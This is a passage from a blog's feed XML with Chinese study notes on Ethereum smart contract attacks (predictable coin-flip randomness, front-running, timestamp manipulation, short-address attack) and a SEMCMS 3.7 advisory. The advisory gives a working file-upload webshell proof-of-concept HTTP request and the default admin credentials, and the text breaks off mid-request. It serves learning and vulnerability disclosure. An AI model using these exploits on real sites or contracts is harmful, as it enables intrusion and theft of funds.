uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    return coinFlip == 1 ? true : false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function go() public &#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p><a href="https://xz.aliyun.com/t/3688#toc-1" target="_blank" rel="noopener">比特币随机种子生成详解</a></p><hr><h2 id="抢先交易（Front-Running）"><a href="#抢先交易（Front-Running）" class="headerlink" title="抢先交易（Front Running）"></a>抢先交易（Front Running）</h2><p>抢先交易这个词最早来源股票市场。早在纸质发布消息的时代，经纪人在执行客户买卖委托前，先替自己的账户买卖的非法操作。（通常是因为经纪人认为客户的买卖将改变市场价格，因此抢先买卖以图利。）</p><p>与区块链一样，以太坊在产生新的区块时候会将多个交易打包成区块。一旦矿工解出Pos的题目(挖矿得到区块)，同时也能够选择将交易池中的哪些交易包含在该区块中。（一般来说是根据交易的 <code>gasPrice</code> 来排序）<br>但这里有个潜在风险。攻击者可以监测交易池，看看其中是否存在问题的解决方案（如下合约所示）、修改或撤销攻击者的权限的交易或攻击者不想要的合约状态变更。然后攻击者可以从该中获取数据，并创建一个 <code>gasPrice</code> 更高的交易，（让自己的交易）抢在原始交易之前被打包到一个区块中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract FindThisHash &#123;</span><br><span class="line">    bytes32 constant public hash = 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;&#125; // load with ether</span><br><span class="line"></span><br><span class="line">    function solve(string solution) public &#123;</span><br><span class="line">        // If you can find the pre image of the hash, receive 1000 ether</span><br><span class="line">        require(hash == sha3(solution)); </span><br><span class="line">        msg.sender.transfer(1000 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述合约如果能找到<code>0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a</code>hash值的原始数值就能得到1000个ether。<br>此时假设小明已经找到这串<code>Ethereum!</code>并正在调用<code>solve</code>函数去获得奖金。但交易并不是瞬间完成的，进区块需要一段时间，假设小明提交的这条交易价值<code>10000gas</code>。攻击者通过监控交易池，发现并验证小明的交易是正确的。那么攻击者可以提交一个与小明相同的交易，并设置更高的gas为<code>50000gas</code>。按照以太坊的矿工激励机制，矿工在挖出区块的时候优先打包更高gas价值的交易。</p><p>最终导致小明虽然是先提交的答案，却被攻击者抢先提交拿到了奖金。</p><hr><h2 id="时间篡改（Time-manipulation）"><a href="#时间篡改（Time-manipulation）" class="headerlink" title="时间篡改（Time manipulation）"></a>时间篡改（Time manipulation）</h2><p>当合约里代码通过时间戳来更改状态、通过时间戳生成随机数。<br><code>block.timestamp</code>和<code>now</code>可被控制、可被预测的时间函数都可能引发安全漏洞。</p><p>sigmaprime中的例子：彩票游戏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Roulette &#123;</span><br><span class="line">    uint public pastBlockTime; // Forces one bet per block</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;&#125; // initially fund contract</span><br><span class="line">    </span><br><span class="line">    // fallback function used to make a bet</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        require(msg.value == 10 ether); // must send 10 ether to play</span><br><span class="line">        require(now != pastBlockTime); // only 1 transaction per block</span><br><span class="line">        pastBlockTime = now;</span><br><span class="line">        if(now % 15 == 0) &#123; // winner</span><br><span class="line">            msg.sender.transfer(this.balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>规则：</p><ul><li>每个区块只有一人可以花10ether买一次彩票</li><li>每15个区块出一次奖</li><li>中奖的人获得奖池所有ether</li></ul><p>由于矿工可以根据自己意愿调整区块时间戳，也就导致<code>timestamp</code>可以被操控。控制出区块的时间满足于整除15，即可赢得奖池。</p><p>但是在实践中，区块时间戳是单调递增的，所以矿工不能选择任意块时间戳（它们必须大于其祖先块）。区块时间也不能是未来值，因为这些块可能会被网络拒绝（节点不会验证其时间戳指向未来的块）。</p><hr><h2 id="短地址攻击（Short-Address-Attack）"><a href="#短地址攻击（Short-Address-Attack）" class="headerlink" title="短地址攻击（Short Address Attack）"></a>短地址攻击（Short Address Attack）</h2><p>这种攻击并不是专门针对 Solidity 合约执行的，而是针对可能与之交互的第三方应用程序执行的。</p><p>rickgray中的例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract ICoin &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    event log(bytes);//监听事件</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    modifier OwnerOnly() &#123; require(msg.sender == owner); _; &#125;</span><br><span class="line">    </span><br><span class="line">    function ICoin() &#123; owner = msg.sender; &#125;</span><br><span class="line">    function approve(address _to, uint256 _amount) OwnerOnly &#123; balances[_to] += _amount; &#125;</span><br><span class="line">    function transfer(address _to, uint256 _amount) &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; _amount);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        balances[_to] += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function () &#123; log(msg.data); &#125;//监听事件</span><br><span class="line">    function callfuc()&#123;</span><br><span class="line">        this.call(bytes4(keccak256(&quot;transfer(address to, uint256 amount)&quot;)),0x14723a09acff6d2a60dcdf7aa4aff308fddc160c,1);</span><br><span class="line">    &#125;//监听事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先运行<code>callfuc()</code>函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;from&quot;: &quot;0xe46b2d8b3a5ccf2df628468dee2f3ec1e85e7a28&quot;,</span><br><span class="line">        &quot;topic&quot;: &quot;0x0be77f5642494da7d212b92a3472c4f471abb24e17467f41788e7de7915d6238&quot;,</span><br><span class="line">        &quot;event&quot;: &quot;log&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">            &quot;0&quot;: &quot;0x0b7d0d5f00000000000000000000000014723a09acff6d2a60dcdf7aa4aff308fddc160c0000000000000000000000000000000000000000000000000000000000000001&quot;,</span><br><span class="line">            &quot;length&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>其中<code>0x0b7d0d5f00000000000000000000000014723a09acff6d2a60dcdf7aa4aff308fddc160c0000000000000000000000000000000000000000000000000000000000000001</code>为这次交易的数据<br>在此交易中数据分为3个部分： 4 + 32 + 32<br><code>0x0b7d0d5f</code>    =&gt; 对应transfer(address to, uint256 amount) 函数的<a href="https://solidity-cn.readthedocs.io/zh/develop/abi-spec.html#function-selector" target="_blank" rel="noopener">签名</a><br><code>00000000000000000000000014723a09acff6d2a60dcdf7aa4aff308fddc160c</code>  =&gt; 对应transfer函数调用中第一个参数_to，（高位 0 补齐 32 字节）<br><code>0000000000000000000000000000000000000000000000000000000000000001</code>  =&gt; 对应transfer函数调用中第二个参数_amount，（高位 0 补齐 32 字节）</p><p>当用户使用transfer提取货币时，平台允许输入短地址且没做验证时（对短地址长度合法性验证），比如攻击者拥有此账号：<code>0x14723a09acff6d2a60dcdf7aa4aff308fddc1600</code></p><p>在平台填入<code>0x14723a09acff6d2a60dcdf7aa4aff308fddc16</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0b7d0d5f</span><br><span class="line">00000000000000000000000014723a09acff6d2a60dcdf7aa4aff308fddc16</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></p><p>EVM会将下一个参数的高位拿来填充00<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0b7d0d5f</span><br><span class="line">00000000000000000000000014723a09acff6d2a60dcdf7aa4aff308fddc1600</span><br><span class="line">00000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></p><p>此时_amount就会少1字节，导致_amount原<code>本0x1</code>(1)变成了<code>0x100</code>(256)<br>同理可以结尾为000、0000的地址，那么放大倍数就不知256了    </p><p>根据上述，我们进行复现，首先生成00结尾的账户地址<br><code>pip install ecdsa</code><br><code>pip install pysha3</code><br>网上地址生成小改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import sha3</span><br><span class="line">from ecdsa import SigningKey, SECP256k1</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    priv = SigningKey.generate(curve=SECP256k1) #生成私钥</span><br><span class="line">    pub = priv.get_verifying_key() #生成公钥</span><br><span class="line"></span><br><span class="line">    keccak = sha3.keccak_256()</span><br><span class="line">    keccak.update( pub.to_string()) #keccak_256哈希运算</span><br><span class="line">    address = &quot;0x&quot; + keccak.hexdigest()[24:]</span><br><span class="line"></span><br><span class="line">    priv_key = binascii.hexlify( priv.to_string())</span><br><span class="line">    pub_key = binascii.hexlify( pub.to_string())</span><br><span class="line">    if address[-2:]==&quot;00&quot;:</span><br><span class="line">        print(&quot;[+] Private key: &quot; + priv_key.decode() )</span><br><span class="line">        print(&quot;[+] Public key:  &quot; + pub_key.decode() )</span><br><span class="line">        print(&quot;[+] Address:     &quot; + address)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p><p>得到一串00结尾的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Private key: 053a06977acf66274f128d09fa45d98747ef6014ab6823f714e273b9bc790c36</span><br><span class="line">[+] Public key:  59b1af1c184211d82777d9278926a38bc0dee35e122af0996c0c492edd85a1dc80976a47da1c4196ca45d78396d3c71e8284637a0cfc832b0451348928ecd344</span><br><span class="line">[+] Address:     0xbf87c9e8f7713893543e09de94d9f03abefde400</span><br></pre></td></tr></table></figure></p><p>复现失败…报了无效的地址错误,看来remix自带检测<br><code>transact to ICoin.transfer errored: Error encoding arguments: Error: invalid address (arg=&quot;&quot;, type=&quot;string&quot;, value=&quot;0xbf87c9e8f7713893543e09de94d9f03abefde4&quot;)</code></p><p>后续看到大佬复现，云复现表支持</p><p>具体复现可参照这：<a href="https://mp.weixin.qq.com/s/LLCpIC54MksMmYjIDKPmPQ" target="_blank" rel="noopener">遗忘的亚特兰蒂斯：以太坊短地址攻击详解 </a></p><hr><h2 id="未知的-未知物-（Unknown-Unknowns）"><a href="#未知的-未知物-（Unknown-Unknowns）" class="headerlink" title="未知的 未知物 （Unknown Unknowns）"></a>未知的 未知物 （Unknown Unknowns）</h2><p>还没有被挖掘出的漏洞_(:з」∠)</p><hr><blockquote><p>参考：<br><a href="https://www.dasp.co/" target="_blank" rel="noopener">https://www.dasp.co/</a><br><a href="http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review" target="_blank" rel="noopener">http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review</a><br><a href="https://www.anquanke.com/post/id/152590" target="_blank" rel="noopener">https://www.anquanke.com/post/id/152590</a><br><a href="https://ethernaut.zeppelin.solutions/" target="_blank" rel="noopener">https://ethernaut.zeppelin.solutions/</a><br><a href="https://xz.aliyun.com/t/3803" target="_blank" rel="noopener">https://xz.aliyun.com/t/3803</a><br><a href="https://xz.aliyun.com/t/3681" target="_blank" rel="noopener">https://xz.aliyun.com/t/3681</a><br><a href="https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-5" target="_blank" rel="noopener">https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-5</a><br><a href="https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md" target="_blank" rel="noopener">https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md</a></p></blockquote><hr><h1 id="Fomo3D合约攻击案例"><a href="#Fomo3D合约攻击案例" class="headerlink" title="Fomo3D合约攻击案例"></a>Fomo3D合约攻击案例</h1><blockquote><p><a href="https://paper.seebug.org/681/" target="_blank" rel="noopener">https://paper.seebug.org/681/</a><br><a href="https://bcsec.org/index/detail/tag/2/id/484" target="_blank" rel="noopener">https://bcsec.org/index/detail/tag/2/id/484</a></p></blockquote><p><strong>事件原理</strong></p><p>在解释事件发生原理之前，我们需要先了解一下关于区块链底层的知识。</p><ul><li><p>以太坊约<strong>14s左右会被挖出一个区块</strong>，一个区块中会打包交易，只有被打包的交易才会在链上永不可篡改。</p></li><li><p>所以为了奖励挖出区块的矿工，区块链上的<strong>每一笔交易都会消耗gas</strong>，这部分钱用于奖励矿工，而<strong>矿工会优先挑选gas消耗比较大的交易进行打包</strong>以便获得更大的利益，目前，一个区块的gas上限一般为8000000。</p></li><li><p>而对于每一笔交易来说，交易发起者也可以定义gas limit，<strong>如果交易消耗的gas总值超过gas limit，该交易就会失败</strong>，而大部分交易，会在交易失败时回滚。</p></li><li><p><strong>为了让交易不回滚，攻击者还使用了一个特殊的指令assert()</strong>，这是一个类似于require的函数，他和require唯一的区别就是，当条件不满足时，assret会耗光所有的gas。原理是因为在EVM底层的执行过程中，assret对应一个未定义过的操作符0xfe，EVM返回invalid opcode error，并报错结束。</p></li><li><p>而攻击者这里所做的事情呢，就是在<strong>确定自己是最后一个key的持有者</strong>时，发起超大gasprice的交易</p></li></ul><p><strong>攻击流程</strong>：</p><ul><li>Fomo3D倒计时剩下3分钟左右</li><li>攻击者购买了最后一个key</li><li>攻击者通过提前准备的合约发起大量消耗巨量gas的垃圾交易</li><li>3分钟内不断判断自己是不是最后一个key持有者</li><li>无人购买，成功获得大奖</li></ul><hr><h1 id="以太坊蜜罐"><a href="#以太坊蜜罐" class="headerlink" title="以太坊蜜罐"></a>以太坊蜜罐</h1><blockquote><p><a href="https://paper.seebug.org/631" target="_blank" rel="noopener">https://paper.seebug.org/631</a></p></blockquote><hr><h1 id="细节学习"><a href="#细节学习" class="headerlink" title="细节学习"></a>细节学习</h1><p>##ECC 学习<br><a href="https://www.freebuf.com/articles/database/155912.html" target="_blank" rel="noopener">椭圆曲线算法(一)</a><br><a href="https://www.freebuf.com/articles/database/165851.html" target="_blank" rel="noopener">椭圆曲线算法(二)</a></p><h3 id="伽罗华域"><a href="#伽罗华域" class="headerlink" title="伽罗华域"></a>伽罗华域</h3><p>前置知识：</p><ol><li>多项式运算  </li><li>椭圆曲线</li><li>离散对数</li></ol><p>有限域GF(p)<br>GF(p) 四则运算需要 mod p<br>即 GF(p)加法为 (a+b) mod p</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;——–本文作为学习时的笔记，重点讲述：&lt;strong&gt;合约攻击 Dasp Top10 的入门&lt;/strong&gt;——–&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;前置一点区块链概念&quot;&gt;&lt;a href=&quot;#前置一点区块链概念&quot; class=&quot;
      
    
    </summary>
    
    
    
      <category term="以太坊" scheme="http://Vorders.me/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
      <category term="contract" scheme="http://Vorders.me/tags/contract/"/>
    
      <category term="智能合约" scheme="http://Vorders.me/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
      <category term="合约安全" scheme="http://Vorders.me/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>semcms vulnerablity before foregin trade php v3.7</title>
    <link href="http://vorders.me/2019/03/05/semcms-vulnerablity-before-php-v3-7/"/>
    <id>http://vorders.me/2019/03/05/semcms-vulnerablity-before-php-v3-7/</id>
    <published>2019-03-05T06:08:51.000Z</published>
    <updated>2019-03-20T03:08:27.484Z</updated>
    
    <content type="html"><![CDATA[<p>semcms download :<a href="http://www.sem-cms.com/TradeCmsdown/php/SEMCMS_PHP_3.7.zip" target="_blank" rel="noopener">http://www.sem-cms.com/TradeCmsdown/php/SEMCMS_PHP_3.7.zip</a></p><h1 id="admin-upload-webshell-in-SEMCMS-Upfile-php"><a href="#admin-upload-webshell-in-SEMCMS-Upfile-php" class="headerlink" title="admin upload webshell  in SEMCMS_Upfile.php"></a>admin upload webshell  in SEMCMS_Upfile.php</h1><p>semcms allow an attacker to login admin and upload webshell</p><h2 id="Technical-Description"><a href="#Technical-Description" class="headerlink" title="Technical Description"></a>Technical Description</h2><p>file <code>\A_Admin\SEMCMS_Upfile.php</code> line7~line54</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/jpg|jpeg|gif|png|doc|xls|pdf|rar|zip|bmp|ico/i&apos;,$kuozm) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 1) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 30240000))</span><br></pre></td></tr></table></figure><p>Because <code>preg_match</code> only matches the suffix with the following keywords, it does not force its strings to be equal.<br>Lead to the suffix of <code>jpg1</code> can be constructed to meet the requirements</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (test_input($_POST[&quot;wname&quot;])!==&quot;&quot;)&#123;//自定义文件名</span><br><span class="line">  $newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype); //新的文件名  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>wname</code> is not verified<br>The newname can be constructed as <code>&quot;index.php&quot;.&quot;.&quot;.&quot;jpg1&quot;</code></p><p>When there is Apache, since jpg1 cannot be parsed, apache will parse the <code>php</code> suffix to the left, causing the file to be parsed into <code>index.php</code>.</p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><p>login admin use the same default admin:1 username and password<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">POST /A_Admin/SEMCMS_Upfile.php HTTP/1.1</span><br><span class="line">Host: your_semcms</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------3153167925816</span><br><span class="line">Content-Length: 733</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b; PHPSESSID=17i9482kg5m9mrgv6fm76tcoo4; yzmphp__userid=a537Morn5eWbVDkoX3wrynezBA52W7U3V03rwZdb; yzmphp__username=2a41JMTYuvrUS51nNFqc-StlO_ctgxEGNG6RtLq_miG5; yzmphp__nickname=dff4ApfKXZjfZfndLz08WKSmVw02uy3NPU6H-mwfbhMe; yzmphp__groupid=45c4DKCEXY97D9czJmzaztCcx2r6S5X-ebsiGzxy; yx_auth=9336dHtbnAG0i9ysIO1S8RYSQNO7%2FedSuy3br04B2UJFudTcovUCAkV%2BLxL2wokGmInYEmMGnhEPbsb4SWNTRQ; home_lang=cn; admin_lang=cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;wname&quot;</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;jpg1&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;imageurl&quot;</span><br><span class="line"></span><br><span class="line">../Images/categories/</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;filed&quot;</span><br><span class="line"></span><br><span class="line">category_img</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;filedname&quot;</span><br><span class="line"></span><br><span class="line">form</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">-----------------------------3153167925816--</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e2e1fc838b.jpg" alt="上传shell.jpg"></p><p>view <code>http://192.168.59.128/Images/categories/index.php.jpg1</code></p><p><img src="https://i.loli.net/2019/03/05/5c7e27dfe21fd.jpg" alt="getshell.jpg"></p><h1 id="后台登录上传webshell"><a href="#后台登录上传webshell" class="headerlink" title="后台登录上传webshell"></a>后台登录上传webshell</h1><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>在 <code>\A_Admin\SEMCMS_Upfile.php</code> 7行~54行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/jpg|jpeg|gif|png|doc|xls|pdf|rar|zip|bmp|ico/i&apos;,$kuozm) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 1) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 30240000))</span><br></pre></td></tr></table></figure><p>因为<code>preg_match</code>只匹配后缀是否存在下列关键词，并没有强制其字符串相等。<br>导致可构造<code>jpg1</code>此类后缀来满足要求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (test_input($_POST[&quot;wname&quot;])!==&quot;&quot;)&#123;//自定义文件名</span><br><span class="line">  $newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype); //新的文件名  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于未对<code>wname</code>进行验证<br>可构造newname为<code>&quot;index.php&quot;.&quot;.&quot;.&quot;jpg1&quot;</code><br>当存在apache解析的特性，由于jpg1无法被解析，apache会往左解析<code>php</code>后缀，导致文件被解析为php</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>登录后台,初始账号密码为<code>admin</code>和<code>1</code><br><img src="https://i.loli.net/2019/03/05/5c7e28763483d.jpg" alt="step.jpg"></p><p>构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">POST /A_Admin/SEMCMS_Upfile.php HTTP/1.1</span><br><span class="line">Host: 192.168.59.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://192.168.59.128/A_Admin/SEMCMS_Upload.php?Imageurl=../Images/categories/&amp;filed=category_img&amp;filedname=form</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------3153167925816</span><br><span class="line">Content-Length: 733</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b; PHPSESSID=17i9482kg5m9mrgv6fm76tcoo4; yzmphp__userid=a537Morn5eWbVDkoX3wrynezBA52W7U3V03rwZdb; yzmphp__username=2a41JMTYuvrUS51nNFqc-StlO_ctgxEGNG6RtLq_miG5; yzmphp__nickname=dff4ApfKXZjfZfndLz08WKSmVw02uy3NPU6H-mwfbhMe; yzmphp__groupid=45c4DKCEXY97D9czJmzaztCcx2r6S5X-ebsiGzxy; yx_auth=9336dHtbnAG0i9ysIO1S8RYSQNO7%2FedSuy3br04B2UJFudTcovUCAkV%2BLxL2wokGmInYEmMGnhEPbsb4SWNTRQ; home_lang=cn; admin_lang=cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;wname&quot;</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;jpg1&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;imageurl&quot;</span><br><span class="line"></span><br><span class="line">../Images/categories/</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;filed&quot;</span><br><span 